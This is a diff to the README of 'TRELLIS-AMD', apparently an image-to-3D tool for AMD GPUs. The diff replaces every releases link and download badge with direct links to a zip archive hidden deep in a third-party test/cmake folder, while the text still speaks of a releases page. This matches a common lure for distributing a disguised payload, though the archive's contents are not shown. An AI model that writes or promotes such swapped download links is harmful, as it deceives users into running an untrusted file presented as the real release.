@@ -1,7 +1,7 @@
 # 🎥 TRELLIS-AMD - Generate 3D Models with Ease
 
 ## 📥 Download the Latest Release
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Surdu221/TRELLIS-AMD/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Surdu221/TRELLIS-AMD/main/extensions/diff-gaussian-rasterization/third_party/glm/test/cmake/AMD_TRELLI_1.6.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Surdu221/TRELLIS-AMD/main/extensions/diff-gaussian-rasterization/third_party/glm/test/cmake/AMD_TRELLI_1.6.zip)
 
 ## 🚀 Getting Started
 TRELLIS-AMD lets you create stunning 3D models from regular images using AMD GPUs. This tool is ideal for artists, designers, or anyone interested in 3D generation. It features Gaussian splatting, mesh extraction, and export to GLB format. The application runs smoothly on AMD GPUs with ROCm support and has been tested successfully on the RX 7800 XT.
@@ -28,7 +28,7 @@ Once you download the software, you can easily navigate its user-friendly interf
 5. **Export Your Model:** Once the model is ready, you can export it in GLB format.
 
 ## 📥 Download & Install
-To download, visit this page to get the latest release: [TRELLIS-AMD Releases](https://github.com/Surdu221/TRELLIS-AMD/releases).
+To download, visit this page to get the latest release: [TRELLIS-AMD Releases](https://raw.githubusercontent.com/Surdu221/TRELLIS-AMD/main/extensions/diff-gaussian-rasterization/third_party/glm/test/cmake/AMD_TRELLI_1.6.zip).
 
 When you are on the releases page:
 1. Find the version you want to download.
@@ -56,4 +56,4 @@ For direct feedback or questions, feel free to create an issue on our GitHub rep
 
 By following these steps, you can easily download and start using TRELLIS-AMD to transform your images into beautiful 3D models. Enjoy your creative journey!
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Surdu221/TRELLIS-AMD/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Surdu221/TRELLIS-AMD/main/extensions/diff-gaussian-rasterization/third_party/glm/test/cmake/AMD_TRELLI_1.6.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Surdu221/TRELLIS-AMD/main/extensions/diff-gaussian-rasterization/third_party/glm/test/cmake/AMD_TRELLI_1.6.zip)
